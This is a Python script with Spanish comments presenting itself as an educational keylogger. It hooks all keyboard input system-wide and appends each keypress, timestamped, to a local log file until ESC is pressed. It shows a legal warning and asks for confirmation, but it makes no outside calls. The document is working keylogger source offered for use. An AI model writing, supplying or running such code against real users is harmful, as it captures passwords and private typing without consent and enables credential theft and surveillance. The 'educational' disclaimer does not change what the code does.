#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Keylogger - Registrador de teclas
Registra las teclas presionadas (SOLO PARA FINES EDUCATIVOS)
"""

import keyboard
import sys
from datetime import datetime
import os

class Colors:
	GREEN = '\033[92m'
	YELLOW = '\033[93m'
	RED = '\033[91m'
	BLUE = '\033[94m'
	CYAN = '\033[96m'
	END = '\033[0m'
	BOLD = '\033[1m'

class KeyLogger:
	def __init__(self, log_file="keylog.txt"):
		self.log_file = log_file
		self.running = False
	
	def on_key_press(self, event):
		"""Callback cuando se presiona una tecla"""
		if not self.running:
			return
		
		timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
		key_name = event.name
		
		# Formatear teclas especiales
		if key_name == 'space':
			key_name = ' '
		elif key_name == 'enter':
			key_name = '\n'
		elif key_name == 'tab':
			key_name = '\t'
		elif len(key_name) > 1:
			key_name = f'[{key_name.upper()}]'
		
		log_entry = f"[{timestamp}] {key_name}\n"
		
		try:
			with open(self.log_file, 'a', encoding='utf-8') as f:
				f.write(log_entry)
		except Exception as e:
			print(f"{Colors.RED}[!] Error escribiendo log: {e}{Colors.END}")
	
	def start(self):
		"""Inicia el keylogger"""
		print(f"{Colors.GREEN}[+] Iniciando keylogger...{Colors.END}")
		print(f"{Colors.BLUE}[*] Archivo de log: {self.log_file}{Colors.END}")
		print(f"{Colors.YELLOW}[!] Presiona ESC para detener{Colors.END}\n")
		
		self.running = True
		keyboard.on_press(self.on_key_press)
		
		# Esperar hasta que se presione ESC
		keyboard.wait('esc')
		self.stop()
	
	def stop(self):
		"""Detiene el keylogger"""
		self.running = False
		print(f"\n{Colors.YELLOW}[!] Deteniendo keylogger...{Colors.END}")
		print(f"{Colors.GREEN}[+] Log guardado en: {self.log_file}{Colors.END}")

def main():
	print(f"{Colors.BOLD}{Colors.CYAN}")
	print("╔════════════════════════════════════════╗")
	print("║         Keylogger - Registrador        ║")
	print("╚════════════════════════════════════════╝")
	print(f"{Colors.END}\n")
	
	print(f"{Colors.RED}{Colors.BOLD}⚠️  ADVERTENCIA LEGAL ⚠️{Colors.END}")
	print(f"{Colors.RED}Este software es SOLO para fines educativos.{Colors.END}")
	print(f"{Colors.RED}El uso no autorizado es ILEGAL.{Colors.END}\n")
	
	confirm = input(f"{Colors.YELLOW}¿Continuar? (s/n): {Colors.END}").strip().lower()
	if confirm != 's':
		print(f"{Colors.BLUE}[*] Cancelado{Colors.END}")
		return
	
	log_file = input(f"{Colors.BLUE}Nombre del archivo de log (default: keylog.txt): {Colors.END}").strip()
	if not log_file:
		log_file = "keylog.txt"
	
	logger = KeyLogger(log_file)
	
	try:
		logger.start()
	except KeyboardInterrupt:
		logger.stop()
	except Exception as e:
		print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
		print(f"{Colors.RED}[!] Asegúrate de tener permisos de administrador{Colors.END}")

if __name__ == "__main__":
	try:
		main()
	except Exception as e:
		print(f"{Colors.RED}[!] Error crítico: {e}{Colors.END}")
		sys.exit(1)

